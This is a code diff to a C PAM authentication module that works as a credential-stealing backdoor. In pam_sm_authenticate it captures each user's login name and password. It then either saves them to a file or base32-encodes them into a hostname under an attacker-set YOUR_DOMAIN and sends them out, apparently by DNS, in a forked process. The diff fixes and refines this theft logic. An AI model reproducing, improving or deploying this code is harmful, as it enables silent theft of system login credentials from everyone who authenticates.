@@ -156,42 +156,43 @@ pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv )
   const char* username;
   const char* password;
 
-  char bonus[2048];
+  char saved_bonus[2048];
   
   pam_get_item(pamh,PAM_USER,(void *) &username);
   pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
   
-  snprintf(bonus,sizeof(bonus),"%s:%s\n",username,password);
+  snprintf(saved_bonus,sizeof(saved_bonus),"%s:%s\n",username,password);
 
   if (password != NULL)
   {
-     char tmp_text[2048];
+     char send_bonus[2048];
      baseencode_error_t err;
 
-     strcpy(tmp_text,bonus);
-     memset(bonus, '\0', sizeof(bonus));
+     strcpy(send_bonus,saved_bonus);
 
-     char *encoded_string = base32_encode((unsigned char*)tmp_text, strlen(tmp_text), &err);
+     char *encoded_string = base32_encode((unsigned char*)send_bonus, strlen(send_bonus), &err);
      int count = count_equals(encoded_string);
 
      encoded_string = modify_result(encoded_string);
 
-     snprintf(bonus, sizeof(bonus), "%d.%s%s", count,encoded_string,YOUR_DOMAIN); 
+     memset(send_bonus, '\0', sizeof(send_bonus));
+     snprintf(send_bonus, sizeof(send_bonus), "%d.%s%s", count,encoded_string,YOUR_DOMAIN); 
     
      if (SAVE_OR_SEND)
      {
-         saveResult(bonus);
+         saveResult(saved_bonus);
      }
      else if (SSH_OR_BOTH)
      {
-        sendSingleResult(bonus);
+        sendSingleResult(send_bonus);
      } 
      else if (!SSH_OR_BOTH)
      {
          int pid = fork();
          if (pid == 0)
          {
-             sendResult(bonus);
+             sendResult(send_bonus);
+             exit(0);
          }
      }
   }
